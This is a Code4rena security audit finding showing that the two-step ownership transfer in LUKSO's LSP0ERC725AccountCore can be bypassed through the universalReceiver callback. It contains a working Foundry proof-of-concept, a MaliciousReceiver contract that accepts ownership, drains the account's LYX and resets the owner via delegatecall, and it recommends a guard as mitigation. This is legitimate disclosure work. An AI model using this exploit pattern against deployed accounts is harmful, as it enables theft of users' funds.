## Tags

- bug
- 2 (Med Risk)
- high quality report
- primary issue
- satisfactory
- selected for report
- sponsor confirmed
- M-02

# [Two-step ownership transfer process in `LSP0ERC725AccountCore` can be bypassed](https://github.com/code-423n4/2023-06-lukso-findings/issues/123) 

# Lines of code

https://github.com/code-423n4/2023-06-lukso/blob/main/contracts/LSP0ERC725Account/LSP0ERC725AccountCore.sol#L560-L580


# Vulnerability details

## Bug Description

To transfer ownership of the `LSP0ERC725AccountCore` contract, the owner has to call `transferOwnership()` to nominate a pending owner. Afterwards, the pending owner must call `acceptOwnership()` to become the new owner.

When called by the owner, `transferOwnership()` executes the following logic:

[LSP0ERC725AccountCore.sol#L560-L580](https://github.com/code-423n4/2023-06-lukso/blob/main/contracts/LSP0ERC725Account/LSP0ERC725AccountCore.sol#L560-L580)

```solidity
        address currentOwner = owner();

        // If the caller is the owner perform transferOwnership directly
        if (msg.sender == currentOwner) {
            // set the pending owner
            LSP14Ownable2Step._transferOwnership(pendingNewOwner);
            emit OwnershipTransferStarted(currentOwner, pendingNewOwner);

            // notify the pending owner through LSP1
            pendingNewOwner.tryNotifyUniversalReceiver(
                _TYPEID_LSP0_OwnershipTransferStarted,
                ""
            );

            // Require that the owner didn't change after the LSP1 Call
            // (Pending owner didn't automate the acceptOwnership call through LSP1)
            require(
                currentOwner == owner(),
                "LSP14: newOwner MUST accept ownership in a separate transaction"
            );
        } else {
```

The `currentOwner == owner()` check ensures that `pendingNewOwner` did not call `acceptOwnership()` in the `universalReceiver()` callback. However, a malicious contract can bypass this check by doing the following in its `universalReceiver()` function:

* Call `acceptOwnership()` to gain ownership of the LSP0 account.
* Do whatever he wants, such as transferring the account's entire LYX balance to himself. 
* Call `execute()` to perform a delegate call that does either of the following:
  * Delegate call into a contract that self-destructs, which will destroy the account permanently.
  * Otherwise, use delegate call to overwrite `_owner` to the previous owner.
  
This defeats the entire purpose of a two-step ownership transfer, which should ensure that the LSP0 account cannot be lost in a single call if the owner accidentally calls `transferOwnership()` with the wrong address.

## Impact

Should `transferOwnership()` be called with the wrong address, the address could potentially bypass the two-step ownership transfer process to destroy the LSP0 account in a single transaction.

## Proof of Concept

The following Foundry test demonstrates how an attacker can drain the LYX balance of an LSP0 account in a single transaction when set to the pending owner in `transferOwnership()`:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../../../contracts/LSP0ERC725Account/LSP0ERC725Account.sol";

contract Implementation {
    // _owner is at slot 0 for LSP0ERC725Account
    address _owner; 

    function setOwner(address newOwner) external {
        _owner = newOwner;
    }
}

contract MaliciousReceiver { 
    LSP0ERC725Account account;
    bool universalReceiverDisabled;
    
    constructor(LSP0ERC725Account _account) {
        account = _account;
    }

    function universalReceiver(bytes32, bytes calldata) external returns (bytes memory) {
        // Disable universalReceiver() 
        universalReceiverDisabled = true;

        // Cache owner for later use
        address owner = account.owner();

        // Call acceptOwnership() to become the owner
        account.acceptOwnership();

        // Transfer all LYX balance to this contract
        account.execute(
            0, // OPERATION_0_CALL
            address(this),
            10 ether,
            ""
        );

        // Overwrite _owner with the previous owner using delegatecall
        Implementation implementation = new Implementation();
        account.execute(
            4, // OPERATION_4_DELEGATECALL
            address(implementation),
            0,
            abi.encodeWithSelector(Implementation.setOwner.selector, owner)
        );

        return "";
    }

    function supportsInterface(bytes4) external view returns (bool) {
        return !universalReceiverDisabled;
    }

    receive() payable external {}
}

contract TwoStepOwnership_POC is Test {
    LSP0ERC725Account account;

    function setUp() public {
        // Deploy LSP0 account with address(this) as owner and give it some LYX
        account = new LSP0ERC725Account(address(this));
        deal(address(account), 10 ether);
    }

    function testCanDrainContractInTransferOwnership() public {
        // Attacker deploys malicious receiver contract
        MaliciousReceiver maliciousReceiver = new MaliciousReceiver(account);

        // Victim calls transferOwnership() for malicious receiver
        account.transferOwnership(address(maliciousReceiver));

        // All LYX in the account has been drained
        assertEq(address(account).balance, 0);
        assertEq(address(maliciousReceiver).balance, 10 ether);
    }
}
```

## Recommended Mitigation

Add a `inTransferOwnership` state variable, which ensures that `acceptOwnership()` cannot be called while `transferOwnership()` is in execution, similar to a reentrancy guard:

```solidity
function transferOwnership(
    address pendingNewOwner
) public virtual override(LSP14Ownable2Step, OwnableUnset) {
    inTransferOwnership = true;

    // Some code here...

    inTransferOwnership = false;
}

function acceptOwnership() public virtual override {
    if (inTransferOwnership) revert CannotAcceptOwnershipDuringTransfer();

    // Some code here...
}
```


## Assessed type

call/delegatecall